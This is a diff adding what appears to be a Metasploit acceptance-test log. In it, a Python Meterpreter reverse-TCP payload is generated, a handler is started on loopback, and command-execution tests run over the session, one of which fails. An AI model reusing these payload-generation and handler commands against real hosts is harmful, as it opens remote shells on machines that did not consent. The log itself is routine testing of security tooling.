@@ -1,0 +1,44 @@
+use python/meterpreter/reverse_tcp
+[4mmsf6[0m payload([1m[31mpython/meterpreter/reverse_tcp[0m) [0m> generate -o /tmp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220204-3257-p2ztmc.py -f raw AutoVerifySessionTimeout=10 MeterpreterTryToFork=false PythonMeterpreterDebug=true lport=6002 lhost=127.0.0.1
+[*] Writing 493 bytes to /tmp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220204-3257-p2ztmc.py...
+[4mmsf6[0m payload([1m[31mpython/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 1
+[4mmsf6[0m payload([1m[31mpython/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6002 
+[*] Sending stage (39800 bytes) to 127.0.0.1
+[*] Meterpreter session 2 opened (127.0.0.1:6002 -> 127.0.0.1:60932 ) at 2022-02-04 03:03:01 +0000
+use test/cmd_exec
+[4mmsf6[0m post([1m[31mtest/cmd_exec[0m) [0m> run session=2 AddEntropy=true Verbose=true
+[*] Running against session 2
+[*] Session type is meterpreter and platform is linux
+[*] Starting cmd_exec tests
+before running test: should return the result of echo
+expected: kZBf - [107, 90, 66, 102] - ASCII-8BIT
+actual: kZBf - [107, 90, 66, 102] - ASCII-8BIT
+[+] should return the result of echo
+before running test: should return the full response after sleeping
+[+] should return the full response after sleeping
+before running test: should return the full response after sleeping
+[+] should return the full response after sleeping
+before running test: should return the result of echo 10 times
+[+] should return the result of echo 10 times
+[*] Finished cmd_exec tests
+[*] Starting cmd_exec quote tests
+before running test: should return the result of echo with single quotes
+expected: tgaL - [116, 103, 97, 76] - ASCII-8BIT
+actual: tgaL - [116, 103, 97, 76] - ASCII-8BIT
+[+] should return the result of echo with single quotes
+before running test: should return the result of echo with double quotes
+expected: zTCA - [122, 84, 67, 65] - ASCII-8BIT
+actual: zTCA - [122, 84, 67, 65] - ASCII-8BIT
+[+] should return the result of echo with double quotes
+[*] Starting cmd_exec stderr tests
+before running test: should return the stderr output
+expected: Nbtk - [78, 98, 116, 107] - ASCII-8BIT
+actual:  - [] - ASCII-8BIT
+[-] FAILED: should return the stderr output
+[*] Testing complete in 5.823441549
+[-] Passed: 6; Failed: 1
+[*] Post module execution completed
+[4mmsf6[0m post([1m[31mtest/cmd_exec[0m) [0m> 
